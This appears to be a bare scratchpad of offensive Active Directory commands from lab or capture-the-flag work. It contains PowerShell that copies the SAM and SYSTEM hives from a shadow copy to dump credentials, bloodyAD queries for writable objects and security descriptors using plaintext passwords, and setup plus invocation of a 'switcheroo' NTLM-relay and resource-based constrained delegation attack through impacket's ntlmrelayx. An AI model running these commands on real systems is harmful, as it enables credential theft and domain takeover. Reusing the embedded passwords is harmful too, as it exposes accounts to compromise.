# a

```
[System.IO.File]::Copy("\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM", "c:\Windows\Temp\sam.copy")

[System.IO.File]::Copy("\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM", "c:\Windows\Temp\system. Copy")

 

````
```
distinguishedName: CN=4b5dc1a3-9310-4eba-bc78-063df97064e8,CN=Packages,CN=Class Store,CN=Machine,CN={21F41D67-D6D9-4B7F-BE7A-88D4CF22E004},CN=Policies,CN=System,DC=ordaprint,DC=local

```
```
bloodyAD --host $dc -d $domain -u $username -p $password get writable --detail
```

```
 
bloodyAD --host 10.129.244.207 -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' get object 'CN=Liz Wilson,CN=Users,DC=garfield,DC=htb' --attr 'nTSecurityDescriptor'
 
```

```
mkdir switcheroo
cd switcheroo

git clone https://github.com/grayhatkiller/switcheroo.git
git clone https://github.com/fortra/impacket.git

python -m venv venv
.\venv\Scripts\Activate.ps1

cd impacket
pip install --only-binary :all: .
pip install pyasn1 ldap3 ldapdomaindump six

cd ..
python -c "from impacket.ldap.ldap import get_entry_values; print('OK')"





$env:PYTHONPATH = "$PWD\impacket"
python switcheroo\switcheroo.py `
  'godfather/shakshak:Aa123456@godc.godfather.local' `
  -dc-ip 192.168.10.114 `
  -base-dn 'DC=godfather,DC=local' `
  -listen-ip 192.168.10.113 `
  -victim 'godfather/wingod$' `
  -modify-dn 'CN=WINGOD,CN=Computers,DC=godfather,DC=local' `
  -rbcd-sid 'S-1-5-21-2068571415-3883400841-4256522035-1112' `
  -ntlmrelayx "$PWD\impacket\examples\ntlmrelayx.py" `
  -debug


```
